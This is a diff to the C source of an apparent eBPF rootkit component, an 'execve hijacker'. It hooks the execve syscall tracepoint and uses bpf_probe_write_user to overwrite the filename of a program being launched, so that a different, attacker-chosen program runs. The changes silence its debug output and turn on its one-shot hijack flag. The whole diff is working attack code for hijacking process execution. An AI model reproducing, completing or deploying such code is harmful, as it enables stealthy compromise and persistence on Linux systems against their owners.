@@ -89,7 +89,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     if(hijacker_state == 1){
         return 0;
     }
-    bpf_printk("Starting execve hijacker\n");
+    //bpf_printk("Starting execve hijacker\n");
     
     unsigned char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
     //unsigned char* envp[PROGRAM_LENGTH] = {0};
@@ -107,13 +107,13 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("Error reading 3\n");
     };
 
-    bpf_printk("OLD ARGV0: %s\n", argv[0]);
+    /*bpf_printk("OLD ARGV0: %s\n", argv[0]);
     bpf_printk("ARGV1: %s\n", argv[1]);
     bpf_printk("ARGV2: %s\n", argv[2]);
     //bpf_printk("ENVP: %s\n", envp);
-    bpf_printk("FILENAME: %s\n", filename);
+    bpf_printk("FILENAME: %s\n", filename);*/
     if((void*)ctx->filename==(void*)(ctx->argv)){
-        bpf_printk("Equal pointers");
+        //bpf_printk("Equal pointers");
     }else{
         //bpf_printk("Not equal pointers %u, %u", ctx->filename, ctx->argv);
     }
@@ -154,10 +154,10 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
 
     //Provided that the case error 2 may happen, we check if we are on that case before going ahead and overwriting everything.
     if(test_write_user_unique(ctx, (char*)filename, (char*)argv[0])!=0){
-        bpf_printk("Test failed\n");
+        //bpf_printk("Test failed\n");
         return -1;
     }else{
-        bpf_printk("Test completed\n");
+        //bpf_printk("Test completed\n");
     }
 
     if(bpf_probe_write_user((void*)(ctx->filename), (void*)to_write, (__u32)sizeof(PATH_EXECUTION_HIJACK_PROGRAM))<0){
@@ -168,7 +168,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         return -1;
     }
      
-    //hijacker_state = 1;
+    hijacker_state = 1;
 
     unsigned char newfilename[ARGUMENT_LENGTH] = {0};
     unsigned char* newargv[NUMBER_ARGUMENTS_PARSED] = {0};
@@ -179,10 +179,10 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("Error reading 1\n");
     };
 
-    bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
+    /*bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
     bpf_printk("NEW ARGV0: %s\n\n", newargv[0]);
     bpf_printk("NEW ARGV1: %s\n", newargv[1]);
-    bpf_printk("NEW ARGV2: %s\n", newargv[2]);
+    bpf_printk("NEW ARGV2: %s\n", newargv[2]);*/
     //bpf_printk("ORIGINAL %s\n\n", filename);
 
     return 0;
